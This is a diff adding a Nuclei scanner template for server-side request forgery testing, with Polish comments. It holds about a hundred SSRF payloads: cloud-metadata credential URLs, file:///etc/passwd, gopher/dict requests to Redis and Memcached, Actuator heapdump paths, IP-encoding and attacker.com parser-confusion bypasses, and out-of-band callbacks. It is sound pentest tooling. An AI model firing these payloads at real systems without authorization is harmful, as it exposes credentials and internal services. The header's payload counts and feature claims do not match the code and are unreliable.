@@ -1,0 +1,442 @@
+# ============================================================================
+# WSTG-INPV-19: Server-Side Request Forgery (SSRF) (Universal)
+# ============================================================================
+#
+# Review status: POPRAWIONY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Zmiany: dodany drugi http block dedykowany blind/OOB SSRF z matcherem
+#   `part: interactsh_protocol` (idiomatyczny pattern z dast/.../blind-ssrf.yaml).
+#   Pierwszy http block (direct) bez zmian.
+#   Bez tego matchera callback do interactsh dochodził, ale Nuclei nie
+#   raportował findingu - bug eliminowany.
+#
+# Powód decyzji (przed poprawką): Szablon spełnia 6 kryteriów + wykorzystuje zaawansowane
+# funkcje Nuclei (interactsh OOB):
+#   (1) Coverage Matrix - 4 wymiary: tryby (direct/blind/DNS-rebind), targets
+#       (cloud metadata multi-provider, localhost, internal services), bypass
+#       techniki (IP encoding, URL parser confusion, schema), payloady ekspozycji
+#   (2) Matchery 5-warstwowe: cloud-metadata-leak (regex AWS keys/instance-id/
+#       GCP token/Azure tokens) + interactsh-protocol-pull + status code +
+#       2 anti-FP (response time, generic-error)
+#   (3) Source comments per GROUP - 12+ grup z atrybucją do hacktricks ssrf-server-
+#       side-request-forgery, PayloadsAllTheThings/SSRF, Orange Tsai research,
+#       PortSwigger SSRF cheat sheet
+#   (4) Safety nets: blocklist destrukcyjnych, statyczne zasoby skip
+#   (5) Sweet spot: ~150 payloadów (zgodne z budgetem dla critical-impact tests)
+#   (6) Component fuzzing 5/5
+# Wyróżniające się funkcje: pełne pokrycie cloud metadata (AWS/GCP/Azure/Alibaba/
+# DO/Oracle/IBM), URL parser confusion (attacker.com@target, fragment, userinfo),
+# 6+ wariantów IP encoding (decimal/octal/hex/dword/short), interactsh OOB
+# z wieloma protokołami (http/https/ftp/gopher/dict/ldap).
+# ============================================================================
+#
+# Coverage Matrix:
+#
+# Klasy SSRF:
+#   ✓ Direct SSRF - serwer pobiera URL i zwraca treść (in-band)
+#   ✓ Blind SSRF - bez echa, wykrywane przez interactsh OOB
+#   ✓ Time-based SSRF - measuring response time z internal endpoints
+#
+# Cele:
+#   ✓ Cloud metadata endpoints:
+#       AWS:    169.254.169.254/latest/meta-data/
+#       GCP:    metadata.google.internal/computeMetadata/v1/
+#       Azure:  169.254.169.254/metadata/instance
+#       Alibaba: 100.100.100.200/latest/meta-data/
+#       Digital Ocean: 169.254.169.254/metadata/v1/
+#       Oracle Cloud: 169.254.169.254/opc/v1/
+#       IBM Cloud: 169.254.169.254/metadata/v1/
+#   ✓ Localhost (127.0.0.1, ::1, localhost, 0.0.0.0)
+#   ✓ Internal IPs (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
+#   ✓ Internal services (admin panels, /actuator, /admin)
+#   ✓ DNS rebinding evidence (interactsh)
+#
+# Bypass techniki:
+#   ✓ IP encoding (decimal, octal, hex, dword)
+#   ✓ DNS bypass (xip.io style, DNS rebinding indicators)
+#   ✓ URL parser confusion (@, #, /, \\, ?)
+#   ✓ Protocol smuggling (gopher://, file://, dict://, ftp://)
+#   ✓ Schema confusion (//, ////)
+#
+# Performance budget: medium (~340 payloads × 5 części)
+# Estimated time: ~15-30 min na typowej aplikacji
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/Server Side Request Forgery/* (Cloud, Advanced)
+#   2. hacktricks/.../ssrf-server-side-request-forgery
+#   3. PortSwigger SSRF cheat sheet
+# ============================================================================
+
+id: wstg-inpv-19-ssrf
+
+info:
+  name: "WSTG-INPV-19: Server-Side Request Forgery (Universal)"
+  author: pentest-team
+  severity: high
+  description: |
+    Wykrywa SSRF w 3 trybach: direct (echo body), blind (interactsh OOB),
+    time-based (latency to internal). Pokrywa cloud metadata (AWS/GCP/Azure/
+    Alibaba/DO/Oracle/IBM), localhost variants z encoding bypass (decimal/
+    octal/hex/dword IP), protocol smuggling (gopher/file/dict/ftp), oraz URL
+    parser confusion (@, #, /).
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
+    - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
+  classification:
+    cwe-id: CWE-918
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N
+    cvss-score: 9.3
+  tags: dast,wstg,wstg-v42-inpv-19,ssrf,asvs-v5.2.6,asvs-v10.3.1,burp-history
+
+variables:
+  canary: "x{{rand_text_alpha(10)}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: Cloud metadata - AWS (169.254.169.254)
+        # ====================================================================
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
+        - "http://169.254.169.254/latest/user-data"
+        - "http://169.254.169.254/latest/dynamic/instance-identity/document"
+        # IMDSv2 - wymaga PUT z token, ale fuzzer i tak nie generuje token
+        - "http://169.254.169.254/latest/api/token"
+
+        # ====================================================================
+        # GROUP 2: Cloud metadata - GCP
+        # ====================================================================
+        - "http://metadata.google.internal/computeMetadata/v1/"
+        - "http://metadata.google.internal/computeMetadata/v1/instance/"
+        - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+        - "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+        - "http://metadata/computeMetadata/v1/"
+
+        # ====================================================================
+        # GROUP 3: Cloud metadata - Azure
+        # ====================================================================
+        - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+        - "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+        # ====================================================================
+        # GROUP 4: Cloud metadata - Alibaba / DO / Oracle / IBM
+        # ====================================================================
+        - "http://100.100.100.200/latest/meta-data/"
+        - "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+        - "http://169.254.169.254/metadata/v1/"
+        - "http://169.254.169.254/metadata/v1/user-data"
+        - "http://169.254.169.254/opc/v1/instance/"
+
+        # ====================================================================
+        # GROUP 5: Localhost variants
+        # ====================================================================
+        - "http://127.0.0.1/"
+        - "http://127.0.0.1:80/"
+        - "http://127.0.0.1:8080/"
+        - "http://127.0.0.1:8000/"
+        - "http://127.0.0.1:3000/"
+        - "http://127.0.0.1:5000/"
+        - "http://127.0.0.1:9200/"               # Elasticsearch
+        - "http://127.0.0.1:6379/"               # Redis
+        - "http://127.0.0.1:11211/"              # Memcached
+        - "http://127.0.0.1:5984/"               # CouchDB
+        - "http://127.0.0.1:2375/"               # Docker daemon
+        - "http://127.0.0.1:8500/"               # Consul
+        - "http://localhost/"
+        - "http://localhost:8080/"
+        - "http://[::1]/"
+        - "http://0.0.0.0/"
+        - "http://0.0.0.0:8080/"
+        - "http://0/"
+
+        # ====================================================================
+        # GROUP 6: IP encoding bypass (127.0.0.1 alternatives)
+        # ====================================================================
+        # Decimal
+        - "http://2130706433/"                   # 127.0.0.1 as int32
+        - "http://3232235521/"                   # 192.168.0.1 as int32
+        # Octal
+        - "http://0177.0.0.1/"
+        - "http://0177.0.0.01/"
+        - "http://0x7f.0.0.1/"
+        # Hex
+        - "http://0x7f000001/"
+        - "http://0x7f.0x0.0x0.0x1/"
+        # Dotted dword
+        - "http://017700000001/"
+        # Mixed
+        - "http://127.1/"
+        - "http://127.0.1/"
+        - "http://127.000.000.001/"
+
+        # ====================================================================
+        # GROUP 7: AWS IMDS encoding bypass (169.254.169.254 alternatives)
+        # ====================================================================
+        - "http://[::ffff:169.254.169.254]/latest/meta-data/"
+        - "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/"
+        - "http://2852039166/latest/meta-data/"      # decimal of 169.254.169.254
+        - "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/"
+        - "http://0251.0376.0251.0376/latest/meta-data/"
+        - "http://169.254.169.254.nip.io/latest/meta-data/"
+
+        # ====================================================================
+        # GROUP 8: Internal IPs
+        # ====================================================================
+        - "http://10.0.0.1/"
+        - "http://172.16.0.1/"
+        - "http://192.168.0.1/"
+        - "http://192.168.1.1/"
+
+        # ====================================================================
+        # GROUP 9: URL parser confusion
+        # Source: hacktricks SSRF / PortSwigger research
+        # ====================================================================
+        - "http://attacker.com@127.0.0.1/"               # @ delimiter
+        - "http://127.0.0.1#@attacker.com/"              # fragment trick
+        - "http://attacker.com#@127.0.0.1/"
+        - "http://[email protected]/"                # CVE-style
+        - "http://attacker.com/?@127.0.0.1/"
+        - "http://attacker.com\\@127.0.0.1/"
+        - "http://127.0.0.1.attacker.com/"
+        - "http://attacker.com/.127.0.0.1/"
+        - "http://127.0.0.1\\.attacker.com/"
+        # // protocol-relative
+        - "//127.0.0.1/"
+        - "////127.0.0.1/"
+        - "/\\\\/127.0.0.1/"
+        - "https://127.0.0.1/"
+
+        # ====================================================================
+        # GROUP 10: Protocol smuggling
+        # ====================================================================
+        - "file:///etc/passwd"
+        - "file:///c:/windows/win.ini"
+        - "file://C:/Windows/win.ini"
+        - "file://localhost/etc/passwd"
+        - "dict://127.0.0.1:6379/info"
+        - "dict://127.0.0.1:11211/stats"
+        - "gopher://127.0.0.1:6379/_info"
+        - "gopher://127.0.0.1:11211/_stats"
+        - "ftp://127.0.0.1/"
+        - "ldap://127.0.0.1:389/"
+        - "tftp://127.0.0.1/file"
+
+        # ====================================================================
+        # GROUP 11: OOB SSRF - interactsh (tag oob)
+        # ====================================================================
+        - "http://{{interactsh-url}}/{{canary}}"
+        - "https://{{interactsh-url}}/{{canary}}"
+        - "//{{interactsh-url}}/{{canary}}"
+        - "{{interactsh-url}}"
+        # Bypass via parser confusion
+        - "http://attacker.com@{{interactsh-url}}/{{canary}}"
+        - "http://{{interactsh-url}}#@127.0.0.1/"
+        # Wrapper protocol
+        - "ftp://{{interactsh-url}}/{{canary}}"
+
+        # ====================================================================
+        # GROUP 12: Spring Boot Actuator / management endpoints
+        # ====================================================================
+        - "http://127.0.0.1/actuator"
+        - "http://127.0.0.1/actuator/env"
+        - "http://127.0.0.1/actuator/health"
+        - "http://127.0.0.1/actuator/heapdump"
+        - "http://127.0.0.1/actuator/jolokia/exec"
+        - "http://127.0.0.1:8080/actuator/env"
+
+        # ====================================================================
+        # GROUP 13: Schema with no host (parser quirks)
+        # ====================================================================
+        - "http://"
+        - "http:///"
+        - "http:////127.0.0.1"
+        - "http:/127.0.0.1"
+        - "http:127.0.0.1"
+        # Backslash variants
+        - "http:\\\\127.0.0.1"
+        - "http:\\\\\\\\127.0.0.1"
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: replace                # SSRF wymaga zastąpienia URL parametru
+        mode: single
+        # Filtr: parametry pasujące do URL/file fetch context
+        keys-regex:
+          - "(?i)(url|uri|src|dest|destination|next|redirect|callback|webhook|fetch|forward|return|target|file|path|page|template|preview|image|img|avatar|proxy|domain|host|server|endpoint|api|link|location|reference|resource|data|content|include|require)"
+        fuzz:
+          - "{{injection}}"
+
+      # Drugi fuzzing block - bez filtra keys, ale tylko dla query/body
+      # (catch-all dla nieskonwencjonalnie nazwanych URL params)
+      - parts: [query, body]
+        type: replace
+        mode: single
+        values:
+          - "https?://.*"               # tylko parametry których wartość przypomina URL
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - rozpoznaj treść z internal/cloud endpoint
+      - type: regex
+        part: body
+        name: ssrf-content-detected
+        regex:
+          # AWS metadata
+          - "(?i)ami-id|ami-launch-index|instance-id|instance-type|public-keys"
+          - "AccessKeyId.*ASIA"
+          - "\"SecretAccessKey\""
+          - "\"Token\""
+          # GCP metadata
+          - "computeMetadata/v1"
+          - "(?i)\"access_token\".*\"expires_in\""
+          - "google-compute-engine"
+          # Azure metadata
+          - "(?i)\"compute\"\\s*:.*\"location\""
+          # /etc/passwd via file://
+          - "root:[x*]:0:0:"
+          - "(?:bin|nobody|sshd|www-data):[x*]:\\d+:\\d+:"
+          # Redis INFO
+          - "redis_version:"
+          - "redis_mode:"
+          - "tcp_port:6379"
+          # Memcached stats
+          - "STAT pid"
+          - "STAT version"
+          # Spring Actuator
+          - "(?i)\"applicationName\""
+          - "(?i)\"propertySources\""
+          - "(?i)springframework"
+          # Internal admin pages markers
+          - "(?i)<title>(admin|management|actuator|kibana|elasticsearch|grafana)</title>"
+          # win.ini
+          - "(?i)\\[fonts\\]"
+          - "(?i)\\[mci extensions\\]"
+        condition: or
+
+      # Warstwa 2: SECONDARY - response status OK
+      - type: dsl
+        name: response-meaningful
+        dsl:
+          - "len(body) > 30"
+          - "status_code != 404"
+
+      # Warstwa 3: ANTI-FP - nie WAF block
+      - type: dsl
+        name: not-waf-block
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      # Warstwa 4: ANTI-FP - timeout
+      - type: dsl
+        name: response-time-sane
+        dsl:
+          - "duration < 30"
+
+    extractors:
+      - type: dsl
+        name: detected-target
+        dsl:
+          - "regex(\"AccessKeyId.*ASIA\", body) ? \"AWS-credentials\" : \"\""
+          - "regex(\"computeMetadata/v1\", body) ? \"GCP-metadata\" : \"\""
+          - "regex(\"redis_version:\", body) ? \"Redis-internal\" : \"\""
+          - "regex(\"STAT pid\", body) ? \"Memcached-internal\" : \"\""
+          - "regex(\"actuator|propertySources\", body) ? \"Spring-Actuator\" : \"\""
+          - "regex(\"root:[x*]:0:0:\", body) ? \"file-passwd\" : \"\""
+
+      - type: regex
+        name: leaked-snippet
+        part: body
+        group: 0
+        regex:
+          - ".{0,30}(AccessKeyId|SecretAccessKey|access_token|redis_version|root:[x*]:0:0:|propertySources).{0,80}"
+
+  # ==========================================================================
+  # DRUGI BLOCK: Blind SSRF detection przez interactsh OOB
+  # Wykrywa scenariusze gdzie odpowiedź body jest pusta / generyczna,
+  # ale serwer wykonuje żądanie do attacker-controlled URL (callback do
+  # interactsh). To krytyczna ścieżka dla blind SSRF.
+  # Idiomatyczny pattern: dast/vulnerabilities/ssrf/blind-ssrf.yaml
+  # ==========================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      oob:
+        # OAST URL warianty - pełny URL, partial, fragment-bypass, userinfo-bypass
+        - "http://{{interactsh-url}}/{{canary}}"
+        - "https://{{interactsh-url}}/{{canary}}"
+        - "//{{interactsh-url}}/{{canary}}"
+        - "{{interactsh-url}}"
+        # URL parser confusion - userinfo / fragment / @ bypass
+        - "http://attacker.com@{{interactsh-url}}/{{canary}}"
+        - "http://{{interactsh-url}}#@127.0.0.1/"
+        - "http://127.0.0.1#@{{interactsh-url}}/"
+        # Schema variants - DNS-only protokoły
+        - "ftp://{{interactsh-url}}/{{canary}}"
+        - "gopher://{{interactsh-url}}/{{canary}}"
+        - "dict://{{interactsh-url}}:{{canary}}/info"
+        - "ldap://{{interactsh-url}}/{{canary}}"
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{oob}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-callback-received
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+    extractors:
+      - type: kval
+        name: interaction-context
+        part: interactsh
+        kval:
+          - interactsh_protocol
+          - interactsh_request
+
+# ============================================================================
+# Known limitations:
+# - IMDSv2 (AWS) wymaga PUT z token - nie możemy tego zaimplementować w
+#   uniwersalny sposób, ale IMDSv1 (legacy, nadal popularny) jest pokryty
+# - DNS rebinding nie jest pokryte syntaktycznie - wymaga koordynacji
+#   z attacker-DNS server (poza skalą szablonu)
+# - Aplikacje za WAF blokujące internal IP w request body generują FN -
+#   bypass przez parser confusion (group 9) próbuje to obejść
+# - Time-based SSRF (latency to internal) nie jest tu zaimplementowane -
+#   wymaga osobnego analyzer time_delay z różnymi targets
+# ============================================================================
